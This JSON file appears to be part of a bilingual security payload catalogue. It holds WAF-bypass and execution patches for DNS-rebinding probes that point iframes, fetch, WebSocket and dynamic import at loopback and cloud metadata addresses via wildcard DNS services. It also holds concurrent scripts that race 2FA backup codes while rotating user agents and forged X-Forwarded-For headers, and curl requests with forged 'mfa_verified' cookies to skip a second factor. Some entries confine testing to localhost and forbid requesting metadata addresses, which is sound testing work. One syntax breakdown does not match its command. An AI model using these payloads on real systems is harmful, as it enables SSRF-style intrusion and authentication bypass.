{
  "schemaVersion": 1,
  "entries": [
    {
      "id": "cmdi2-browser-dns-rebinding-iframe-probes",
      "patches": [
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": "<iframe src=\"http://127-0-0-1.sslip.io/\"></iframe>\n<iframe src=\"http://169-254-169-254.sslip.io/latest/meta-data/\"></iframe>",
          "syntaxBreakdown": [
            {
              "part": "http://127-0-0-1.sslip.io/",
              "explanation": {
                "zh": "连字符 IP 编码",
                "en": "Hyphen-encoded IP"
              },
              "type": "payload"
            },
            {
              "part": "http://169-254-169-254.sslip.io/latest/meta-data/",
              "explanation": {
                "zh": "连字符元数据地址",
                "en": "Hyphen metadata URL"
              },
              "type": "url"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 1,
          "expectedCommand": "<iframe src=\"http://a.127.0.0.1.nip.io/\"></iframe> \n <iframe src=\"http://b.--1.sslip.io/\"></iframe>",
          "syntaxBreakdown": [
            {
              "part": "http://a.127.0.0.1.nip.io/",
              "explanation": {
                "zh": "多级子域",
                "en": "Multi-level subdomain"
              },
              "type": "payload"
            },
            {
              "part": "http://b.[::1].nip.io/",
              "explanation": {
                "zh": "IPv6 子域",
                "en": "IPv6 subdomain"
              },
              "type": "payload"
            }
          ],
          "title": {
            "zh": "多级子域通配变形",
            "en": "Multi-Level Subdomain Rebinding"
          },
          "description": {
            "zh": "多级子域前缀仍命中通配解析并改变请求域名特征；真正的二次解析重绑定需 rbndr.us 类双地址轮换服务配合短 TTL 完成。成功判据：首帧校验通过、次帧访问内网。",
            "en": "Multi-level subdomains trigger TTL-based rotation enabling second-resolution rebinding. Success: first frame passes checks while the next reaches the intranet."
          },
          "command": "<iframe src=\"http://a.127.0.0.1.nip.io/\"></iframe> \n <iframe src=\"http://b.--1.sslip.io/\"></iframe>"
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "<iframe sandbox=\"allow-same-origin\" srcdoc='<iframe src=\"http://127.0.0.1.nip.io/\"></iframe>'></iframe>",
          "syntaxBreakdown": [
            {
              "part": "<iframe sandbox=\"allow-same-origin\" srcdoc=",
              "explanation": {
                "zh": "沙箱嵌套帧",
                "en": "Sandboxed nested frame"
              },
              "type": "payload"
            },
            {
              "part": "allow-same-origin",
              "explanation": {
                "zh": "同源许可标志",
                "en": "Same-origin allow flag"
              },
              "type": "value"
            }
          ]
        },
        {
          "area": "execution",
          "index": 0,
          "expectedCommand": "<iframe src=\"http://127.0.0.1.nip.io/\"></iframe>\n<iframe src=\"http://169.254.169.254.nip.io/latest/meta-data/\"></iframe>\n<iframe src=\"http://127.0.0.1.sslip.io/\"></iframe>\n<iframe src=\"http://169.254.169.254.sslip.io/latest/meta-data/\"></iframe>\n<iframe src=\"http://7f000001.a9fea9fe.rbndr.us/\"></iframe>\n<iframe src=\"http://127.0.0.1.7f000001.1u.ms/\"></iframe>",
          "description": {
            "zh": "样例域名来自公共通配 DNS 且包含元数据地址，仅作载荷形态演示；真实验证须改用自有隔离 DNS 名称和本地标记服务，iframe 成功加载出标记页即为命中证据，禁止请求 169.254.169.254 或第三方公共服务。",
            "en": "The originals contain public resolver names and metadata addresses. Replace them with a controlled isolated DNS name and local marker service; do not request 169.254.169.254 or public third-party services."
          }
        }
      ]
    },
    {
      "id": "cmdi2-browser-dns-rebinding-fetch-probes",
      "patches": [
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": "<script>fetch('http://127.0.0.1.nip.io/',{mode:'no-cors',keepalive:true}).catch(e=>document.title='ERR')</script>",
          "syntaxBreakdown": [
            {
              "part": "mode:'no-cors',keepalive:true",
              "explanation": {
                "zh": "无 CORS 加保活",
                "en": "No-cors with keepalive"
              },
              "type": "payload"
            },
            {
              "part": ".catch(e=>document.title='ERR')",
              "explanation": {
                "zh": "错误信号回传",
                "en": "Error signal to title"
              },
              "type": "function"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 1,
          "expectedCommand": "<script>new WebSocket('ws://127.0.0.1.nip.io:8080/').onopen=()=>document.title='OPEN';</script>",
          "syntaxBreakdown": [
            {
              "part": "new WebSocket(",
              "explanation": {
                "zh": "建立 WebSocket",
                "en": "Opens a WebSocket"
              },
              "type": "function"
            },
            {
              "part": "ws://127.0.0.1.nip.io:8080/",
              "explanation": {
                "zh": "ws 回环映射地址",
                "en": "WebSocket loopback URL"
              },
              "type": "url"
            },
            {
              "part": ".onopen=",
              "explanation": {
                "zh": "开放回调",
                "en": "On-open callback"
              },
              "type": "function"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "<script>const u=URL.createObjectURL(new Blob([\"import('http://127.0.0.1.nip.io/x.js').catch(e=>{})\"]));import(u);</script>",
          "syntaxBreakdown": [
            {
              "part": "URL.createObjectURL(new Blob(",
              "explanation": {
                "zh": "创建 Blob URL",
                "en": "Creates a Blob URL"
              },
              "type": "function"
            },
            {
              "part": "import(u)",
              "explanation": {
                "zh": "动态导入",
                "en": "Dynamic import"
              },
              "type": "function"
            },
            {
              "part": "http://127.0.0.1.nip.io/x.js",
              "explanation": {
                "zh": "内网脚本地址",
                "en": "Internal script URL"
              },
              "type": "url"
            }
          ]
        }
      ]
    },
    {
      "id": "auth-2fa-recovery-code",
      "patches": [
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": "python3 - <<'PY' \n import asyncio, aiohttp \n TARGET=\"http://127.0.0.1:8080/test/verify-backup-code\" \n async def main(): \n     async with aiohttp.ClientSession() as s: \n         rs = await asyncio.gather(*[s.post(TARGET, json={\"backup_code\":\"PAYLOADER_BACKUP_CODE\",\"session\":\"PAYLOADER_TEST_SESSION\"}) for _ in range(200)]) \n         print(sum(r.status == 200 for r in rs)) \n asyncio.run(main()) \n PY",
          "syntaxBreakdown": [
            {
              "part": "python3 - <<'PY'",
              "explanation": {
                "zh": "heredoc 执行脚本",
                "en": "Runs an inline Python heredoc"
              },
              "type": "control"
            },
            {
              "part": "aiohttp.ClientSession()",
              "explanation": {
                "zh": "异步 HTTP 会话",
                "en": "Async HTTP session"
              },
              "type": "function"
            },
            {
              "part": "asyncio.gather(",
              "explanation": {
                "zh": "并发收集请求",
                "en": "Gathers concurrent requests"
              },
              "type": "function"
            },
            {
              "part": "sum(r.status == 200 for r in rs)",
              "explanation": {
                "zh": "统计成功数",
                "en": "Counts successes"
              },
              "type": "function"
            }
          ],
          "command": "python3 - <<'PY' \n import asyncio, aiohttp \n TARGET=\"http://127.0.0.1:8080/test/verify-backup-code\" \n async def main(): \n     async with aiohttp.ClientSession() as s: \n         rs = await asyncio.gather(*[s.post(TARGET, json={\"backup_code\":\"PAYLOADER_BACKUP_CODE\",\"session\":\"PAYLOADER_TEST_SESSION\"}) for _ in range(200)]) \n         print(sum(r.status == 200 for r in rs)) \n asyncio.run(main()) \n PY"
        },
        {
          "area": "wafBypass",
          "index": 1,
          "expectedCommand": "python3 - <<'PY'\nimport concurrent.futures, itertools, requests\nTARGET=\"http://127.0.0.1:8080/test/verify-backup-code\"\nuas=itertools.cycle([\"Mozilla/5.0\",\"curl/8.0\",\"python-requests\"])\ndef hit(i):\n    return requests.post(TARGET, json={\"code\":\"PAYLOADER_BACKUP_CODE\"}, headers={\"User-Agent\":next(uas),\"X-Forwarded-For\":f\"10.0.{i//250}.{i%250}\"}).status_code\nwith concurrent.futures.ThreadPoolExecutor(50) as ex:\n    codes=list(ex.map(hit, range(200)))\nprint(codes.count(200))\nPY",
          "syntaxBreakdown": [
            {
              "part": "itertools.cycle([\"Mozilla/5.0\",\"curl/8.0\",\"python-requests\"])",
              "explanation": {
                "zh": "轮换 UA",
                "en": "Rotates user agents"
              },
              "type": "function"
            },
            {
              "part": "\"X-Forwarded-For\":f\"10.0.{i//250}.{i%250}\"",
              "explanation": {
                "zh": "轮换伪造 XFF",
                "en": "Rotates forged XFF"
              },
              "type": "payload"
            },
            {
              "part": "ThreadPoolExecutor(50)",
              "explanation": {
                "zh": "五十线程并发",
                "en": "50 worker threads"
              },
              "type": "function"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "for suffix in \"/\" \".json\" \"/v2\"; do curl -sS --max-time 5 -o /dev/null -w \"%{http_code} $suffix\\n\" -d \"code=PAYLOADER_BACKUP_CODE\" \"http://127.0.0.1:8080/test/verify-backup-code${suffix}\"; done",
          "syntaxBreakdown": [
            {
              "part": "for suffix in \"/\" \".json\" \"/v2\"",
              "explanation": {
                "zh": "遍历路径后缀",
                "en": "Iterates path suffixes"
              },
              "type": "control"
            },
            {
              "part": "\"http://127.0.0.1:8080/test/verify-backup-code${suffix}\"",
              "explanation": {
                "zh": "后缀变形端点",
                "en": "Endpoint with suffix"
              },
              "type": "url"
            },
            {
              "part": "-d \"code=PAYLOADER_BACKUP_CODE\"",
              "explanation": {
                "zh": "恢复码参数",
                "en": "Backup code param"
              },
              "type": "payload"
            }
          ]
        },
        {
          "area": "execution",
          "index": 0,
          "expectedCommand": "python3 - <<'PY' \n import concurrent.futures \n import requests \n TARGET = \"http://127.0.0.1:8080/test/verify-backup-code\" \n def consume(_): \n     return requests.post(TARGET, json={\"backup_code\": \"PAYLOADER_TEST_BACKUP\", \"session\": \"PAYLOADER_TEST_SESSION\"}, timeout=5).status_code \n with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool: \n     results = list(pool.map(consume, range(2))) \n print(results) \n PY \n # Expected: exactly one request consumes the synthetic code; the other fails atomically.",
          "command": "python3 - <<'PY' \n import concurrent.futures \n import requests \n TARGET = \"http://127.0.0.1:8080/test/verify-backup-code\" \n def consume(_): \n     return requests.post(TARGET, json={\"backup_code\": \"PAYLOADER_TEST_BACKUP\", \"session\": \"PAYLOADER_TEST_SESSION\"}, timeout=5).status_code \n with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool: \n     results = list(pool.map(consume, range(2))) \n print(results) \n PY \n # Expected: exactly one request consumes the synthetic code; the other fails atomically."
        }
      ]
    },
    {
      "id": "auth-2fa-state-enforcement",
      "patches": [
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": "curl -sS --max-time 5 -H \"Accept: application/json\" -b \"session=PAYLOADER_FIRST_FACTOR_ONLY\" http://127.0.0.1:8080/marker",
          "syntaxBreakdown": [
            {
              "part": "-H \"Accept: application/json\"",
              "explanation": {
                "zh": "JSON 响应类型",
                "en": "JSON accept header"
              },
              "type": "header"
            },
            {
              "part": "-b \"session=PAYLOADER_FIRST_FACTOR_ONLY\"",
              "explanation": {
                "zh": "携带单因素会话",
                "en": "Sends first-factor session"
              },
              "type": "flag"
            },
            {
              "part": "http://127.0.0.1:8080/marker",
              "explanation": {
                "zh": "受保护资源",
                "en": "Protected resource"
              },
              "type": "url"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 1,
          "expectedCommand": "curl -sS --max-time 5 -X POST -d \"x=1\" -b \"session=PAYLOADER_FIRST_FACTOR_ONLY\" http://127.0.0.1:8080/marker",
          "syntaxBreakdown": [
            {
              "part": "-X POST",
              "explanation": {
                "zh": "改用 POST",
                "en": "Switches to POST"
              },
              "type": "flag"
            },
            {
              "part": "-d \"x=1\"",
              "explanation": {
                "zh": "任意请求体",
                "en": "Arbitrary body"
              },
              "type": "payload"
            },
            {
              "part": "-b \"session=PAYLOADER_FIRST_FACTOR_ONLY\"",
              "explanation": {
                "zh": "携带单因素会话",
                "en": "Sends first-factor session"
              },
              "type": "flag"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "curl -sS --max-time 5 -b \"session=PAYLOADER_FIRST_FACTOR_ONLY; mfa=1; mfa_verified=true\" http://127.0.0.1:8080/marker",
          "syntaxBreakdown": [
            {
              "part": "-b \"session=PAYLOADER_FIRST_FACTOR_ONLY; mfa=1; mfa_verified=true\"",
              "explanation": {
                "zh": "叠加状态 Cookie",
                "en": "Stacked state cookies"
              },
              "type": "payload"
            },
            {
              "part": "mfa=1",
              "explanation": {
                "zh": "mfa 标志",
                "en": "mfa flag"
              },
              "type": "value"
            },
            {
              "part": "mfa_verified=true",
              "explanation": {
                "zh": "已验证标志",
                "en": "Verified flag"
              },
              "type": "value"
            }
          ]
        },
        {
          "area": "execution",
          "index": 0,
          "expectedCommand": "GET /marker HTTP/1.1 \n Host: app.example.invalid \n Cookie: session=PAYLOADER_FIRST_FACTOR_ONLY \n  \n POST /verify-2fa HTTP/1.1 \n Host: app.example.invalid \n Content-Type: application/json \n Content-Length: 28 \n  \n {\"otp\":\"000000\",\"skip\":true} \n # Expected: the marker and skip flag are rejected unless the server session records a valid second factor.",
          "command": "GET /marker HTTP/1.1 \n Host: app.example.invalid \n Cookie: session=PAYLOADER_FIRST_FACTOR_ONLY \n  \n POST /verify-2fa HTTP/1.1 \n Host: app.example.invalid \n Content-Type: application/json \n Content-Length: 28 \n  \n {\"otp\":\"000000\",\"skip\":true} \n # Expected: the marker and skip flag are rejected unless the server session records a valid second factor."
        }
      ]
    }
  ]
}
